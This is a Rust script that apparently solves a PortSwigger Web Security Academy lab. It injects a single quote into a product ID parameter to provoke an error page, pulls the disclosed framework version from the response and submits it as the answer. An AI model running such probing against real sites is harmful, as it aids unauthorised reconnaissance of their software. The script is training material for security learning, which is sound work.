/*******************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 2/9/2023
*
* PortSwigger LAB: Information disclosure in error messages
*
* Steps: 1. Inject a single queot in the product ID parameter to cause an error
*        2. Extract the framework name
*        3. Submit the answer
*
********************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    error::Error,
    io,
    io::Write,
    process,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let start_time = time::Instant::now();
    let url = "https://0a7300a40434076880dabc62000e00c3.web-security-academy.net"; // change this to your lab URL
    let client = build_client(); // build the client used in all subsequent requests

    println!("{} {}", "1. Injecting the payload..".white(), "OK".green());
    let product_req = client.get(format!("{url}/product?productId=4'")).send(); // inject the payload
    if let Ok(res) = product_req {
        // if the request is sent successfully
        let body = res.text().unwrap(); // get the body of the response
        let framework = extract_pattern("Apache Struts 2 2.3.31", &body); // extract the framework name; change this if it is changed in your case
        if let Some(text) = framework {
            // if the name is found
            println!(
                "{} {} => {}",
                "2. Extracting the framework name..".white(),
                "OK".green(),
                text.yellow()
            );
            let submit_answer = client
                .post(format!("{url}/submitSolution"))
                .form(&HashMap::from([("answer", text)]))
                .send(); // submit the answer
            if let Ok(res) = submit_answer {
                println!("{} {}", "3. Submitting the answer..".white(), "OK".green())
            } else {
                println!("{}", "[!] Failed to submit the answer".red())
            }
        } else {
            println!("{}", "[!] No framework names was found".red())
        }
    }
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    let search_pattern = pattern.find(text);
    if search_pattern.is_some() {
        return Some(search_pattern.unwrap().as_str().to_string());
    } else {
        None
    }
}
